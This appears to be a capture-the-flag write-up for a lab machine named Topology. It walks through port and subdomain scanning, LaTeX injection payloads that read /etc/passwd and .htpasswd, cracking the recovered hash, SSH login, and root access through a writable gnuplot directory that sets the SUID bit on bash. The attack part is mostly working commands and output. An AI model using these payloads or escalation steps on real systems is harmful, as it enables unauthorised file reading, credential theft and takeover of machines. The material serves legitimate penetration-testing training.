# Topology

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.168.236
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 19:10 UTC
Nmap scan report for 10.129.168.236
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/10%OT=22%CT=1%CU=36509%PV=Y%DS=2%DC=T%G=Y%TM=6484CAC
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   111.24 ms 10.10.16.1
2   192.08 ms 10.129.168.236

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.06 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.168.236
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 19:11 UTC
Nmap scan report for 10.129.168.236
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/10%OT=22%CT=1%CU=43616%PV=Y%DS=2%DC=T%G=Y%TM=6484CB0
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   72.23 ms 10.10.16.1
2   33.81 ms 10.129.168.236

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.23 seconds
```

```c
$ sudo nmap -sV -sU 10.129.168.236
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 19:17 UTC
Nmap scan report for topology.htb (10.129.168.236)
Host is up (0.078s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT     STATE         SERVICE  VERSION
68/udp   open|filtered dhcpc
5353/udp open|filtered zeroconf

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1132.49 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.168.236/

```c
$ whatweb http://10.129.168.236 
http://10.129.168.236 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[lklein@topology.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.168.236], Title[Miskatonic University | Topology Group]
```

Found `topology.htb` and added it to my `/etc/hosts`.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.168.236  topology.htb
```

Found some `names`.

| Name |
| --- |
| Lilian Klein |
| Vajramani Daisley |
| Derek Abrahams |

I Clicked on `LaTeX Equation Generator`.

> http://latex.topology.htb/equation.php

I addded `latex.topology.htb` one as well.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.168.236  topology.htb
10.129.168.236  latex.topology.htb
```

### Subdomain Enumeration with ffuf

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.topology.htb" -u http://topology.htb --mc all --fs 6767

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://topology.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 6767
________________________________________________

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 65ms]
    * FUZZ: # license, visit http://creativecommons.org/licenses/by-sa/3.0/

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 54ms]
    * FUZZ: # Attribution-Share Alike 3.0 License. To view a copy of this

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 59ms]
    * FUZZ: #

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 59ms]
    * FUZZ: # This work is licensed under the Creative Commons

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 60ms]
    * FUZZ: # Priority-ordered case-insensitive list, where entries were found

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 76ms]
    * FUZZ: # directory-list-lowercase-2.3-medium.txt

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 73ms]
    * FUZZ: # on at least 2 different hosts

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 77ms]
    * FUZZ: # Suite 300, San Francisco, California, 94105, USA.

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 85ms]
    * FUZZ: #

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 96ms]
    * FUZZ: # Copyright 2007 James Fisher

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 103ms]
    * FUZZ: # or send a letter to Creative Commons, 171 Second Street,

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 104ms]
    * FUZZ: #

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 104ms]
    * FUZZ: #

[Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 1630ms]
    * FUZZ: stats

[Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 1963ms]
    * FUZZ: dev

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 125ms]
    * FUZZ: '

[Status: 200, Size: 2828, Words: 171, Lines: 26, Duration: 2687ms]
    * FUZZ: latex

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 76ms]
    * FUZZ: %20

[Status: 400, Size: 304, Words: 26, Lines: 11, Duration: 95ms]
    * FUZZ: $file
<--- SNIP --->
```

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.168.236  topology.htb
10.129.168.236  latex.topology.htb
10.129.168.236  stats.topology.htb
10.129.168.236  dev.topology.htb
```

### Enumeration of stats.topology.htb

> http://stats.topology.htb/

```c
$ whatweb http://stats.topology.htb/
http://stats.topology.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.168.236]
```

### Enumeration of dev.topology.htb

> http://dev.topology.htb

```c
$ whatweb http://dev.topology.htb/
http://dev.topology.htb/ [401 Unauthorized] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.168.236], Title[401 Unauthorized], WWW-Authenticate[Under construction][Basic]
```

### Testing LaTeX

We tested a few payloads.

Got the response `Illegal command detected. Sorry.` a lot of the time.

Then we checked the `root directory`.

> http://latex.topology.htb/

```c
$ wget http://latex.topology.htb/tempfiles/texput.log
--2023-06-10 19:42:18--  http://latex.topology.htb/tempfiles/texput.log
Resolving latex.topology.htb (latex.topology.htb)... 10.129.168.236
Connecting to latex.topology.htb (latex.topology.htb)|10.129.168.236|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 814
Saving to: ‘texput.log’

texput.log                                                 100%[========================================================================================================================================>]     814  --.-KB/s    in 0s      

2023-06-10 19:42:21 (124 MB/s) - ‘texput.log’ saved [814/814]
```

```c
$ cat texput.log 
This is pdfTeX, Version 3.14159265-2.6-1.40.20 (TeX Live 2019/Debian) (preloaded format=pdflatex 2022.2.15)  17 JAN 2023 12:08
entering extended mode
 restricted \write18 enabled.
 %&-line parsing enabled.
**31259343863c6d5f75d6e09.97694898.tex

! Emergency stop.
<*> 31259343863c6d5f75d6e09.97694898.tex
                                        
End of file on the terminal!

 
Here is how much of TeX's memory you used:
 3 strings out of 483183
 134 string characters out of 5966292
 231602 words of memory out of 5000000
 15122 multiletter control sequences out of 15000+600000
 532338 words of font info for 24 fonts, out of 8000000 for 9000
 14 hyphenation exceptions out of 8191
 0i,0n,0p,1b,6s stack positions out of 5000i,500n,10000p,200000b,80000s
!  ==> Fatal error occurred, no output PDF file produced!
```

```c
$ wget http://latex.topology.htb/header.tex
--2023-06-10 19:45:17--  http://latex.topology.htb/header.tex
Resolving latex.topology.htb (latex.topology.htb)... 10.129.168.236
Connecting to latex.topology.htb (latex.topology.htb)|10.129.168.236|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 502 [text/x-tex]
Saving to: ‘header.tex’

header.tex                                                 100%[========================================================================================================================================>]     502  --.-KB/s    in 0s      

2023-06-10 19:45:20 (72.8 MB/s) - ‘header.tex’ saved [502/502]
```

```c
$ cat header.tex 
% vdaisley's default latex header for beautiful documents
\usepackage[utf8]{inputenc} % set input encoding
\usepackage{graphicx} % for graphic files
\usepackage{eurosym} % euro currency symbol
\usepackage{times} % set nice font, tex default font is not my style
\usepackage{listings} % include source code files or print inline code
\usepackage{hyperref} % for clickable links in pdfs
\usepackage{mathtools,amssymb,amsthm} % more default math packages
\usepackage{mathptmx} % math mode with times font
```

> https://0day.work/hacking-with-latex/

Payload:

```c
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

Modified Payload:

```c
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\read\file to\line
\text{\line}\read\file to\line
\text{\line}
\read\file to\line
\text{\line}
\closein\file
```

Modified Payload:

```c
\newread\file
\openin\file=/var/www/dev/.env
\read\file to\line
\read\file to\line
\read\file to\line
\read\file to\line
\read\file to\line
\read\file to\line
\text{\line}
\closein\file
```

We were able to read a few lines from files but not the whole files itself.

## Foothold

Nothing so far. Then I read about the `Math Mode` in `LaTeX` in which I was operating and how to exit and enter it,
by adding `$` characters to the command.

`By default, LaTeX is in text mode, but its real power comes when you need to typeset equations and mathematics. You enter and exit math mode by using the dollar-sign, $.`

Payload:

```c
$\lstinputlisting{/etc/passwd}$
```

Output:

> http://latex.topology.htb/equation.php?eqn=%24%5Clstinputlisting%7B%2Fetc%2Fpasswd%7D%24&submit=

Payload:

```c
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

Output:

> http://latex.topology.htb/equation.php?eqn=%24%5Clstinputlisting%7B%2Fvar%2Fwww%2Fdev%2F.htpasswd%7D%24&submit=

```c
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

### Cracking the Hash

```c
$ cat hash
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

```c
$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (vdaisley)     
1g 0:00:00:03 DONE (2023-06-11 11:58) 0.2570g/s 255967p/s 255967c/s 255967C/s callel..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Username | Password |
| --- | --- |
| vdaisley | calculus20 |

```c
$ ssh vdaisley@topology.htb
The authenticity of host 'topology.htb (10.129.168.236)' can't be established.
ED25519 key fingerprint is SHA256:F9cjnqv7HiOrntVKpXYGmE9oEaCfHm5pjfgayE/0OK0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'topology.htb' (ED25519) to the list of known hosts.
vdaisley@topology.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jun  6 08:13:40 2023 from 10.10.14.46
vdaisley@topology:~$
```

## user.txt

```c
vdaisley@topology:~$ cat user.txt 
3216cb0504937ce6fc960391135f34bf
```

## Enumeration

```c
vdaisley@topology:~$ id
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
```

```c
vdaisley@topology:~$ sudo -l
[sudo] password for vdaisley: 
Sorry, user vdaisley may not run sudo on topology.
```

```c
vdaisley@topology:~$ ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 May 19 13:04 .
drwxr-xr-x 18 root root 4096 May 19 13:04 ..
drwx-wx-wx  2 root root 4096 Jun  6 08:14 gnuplot
```

I was able to write into the directory. I looked for `gnuplot` files.
To execute commands I needed `system` in the `.plt` file.

> http://www.gnuplot.info/docs_4.2/node327.html

```c
vdaisley@topology:~$ echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/root.plt
```

```c
vdaisley@topology:~$ gnuplot

        G N U P L O T
        Version 5.2 patchlevel 8    last modified 2019-12-01 

        Copyright (C) 1986-1993, 1998, 2004, 2007-2019
        Thomas Williams, Colin Kelley and many others

        gnuplot home:     http://www.gnuplot.info
        faq, bugs, etc:   type "help FAQ"
        immediate help:   type "help"  (plot window: hit 'h')

Terminal type is now 'unknown'
gnuplot> exit
```

```c
vdaisley@topology:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

```c
vdaisley@topology:~$ /bin/bash -p
bash-5.0#
```

## root.txt

```c
bash-5.0# cat /root/root.txt
5064645aa472826fc40cf9369c12fdc7
```
